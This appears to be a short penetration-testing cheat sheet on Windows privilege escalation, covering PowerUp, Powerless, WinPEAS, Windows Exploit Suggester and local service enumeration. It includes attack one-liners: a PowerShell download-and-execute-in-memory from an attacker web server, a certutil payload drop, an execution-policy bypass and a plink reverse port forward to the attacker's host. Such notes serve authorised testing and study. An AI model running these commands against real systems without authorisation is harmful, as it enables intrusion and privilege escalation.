
- PowerUP
  - Powershell required
  - Download `wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1`
  - Run on Windows `powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"`
  - Download and execute in memory `powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/PowerUp.ps1');Invoke-AllChecks`
  
- Powerless
  - For legacy systems
  - Powershell not available
  - Download `wget https://raw.githubusercontent.com/gladiatx0r/Powerless/blob/master/Powerless.bat`
  - Drop `certutil.exe -urlcache -split -f "http://$IP/Powerless.bat" Powerless.bat`
  - Run on Windows `Powerless.bat`
  
 - WinPEAS
   - Release https://github.com/carlospolop/PEASS-ng/releases/tag/20220807
    
 - Windows Exploit Suggester
   - https://github.com/AonCyberLabs/Windows-Exploit-Suggester
   - Download `wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py`
   - Run `systeminfo` on the target Windows machine and save the output in a txt file.
   - `python windows-exploit-suggester.py --update`
   - `python windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo systeminfo.txt`
   - Grep 'Elevation' `./windows-exploit-suggester.py –database 2015-09-22-mssb.xlsx –systeminfo systeminfo_1.txt | grep 'Elevation'`
    
- Enumerate Local Services
  - `netstat -ano`
  - Look for LISTENING/LISTEN. Compare that to the scan you did from the outside. Does it contain any ports that are not accessible from the outside? If that is the case, maybe you can make a remote forward to access it.
  
   `plink32.exe -ssh -l <MYUSERNAME> -pw <MYPASSWORD> -R <MYIP>:<MYPORT>:127.0.0.1:8090 <MYIP>`
   
    ```
      # Port forward using plink
      plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
    ```
    
    [plink.exe binaries](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
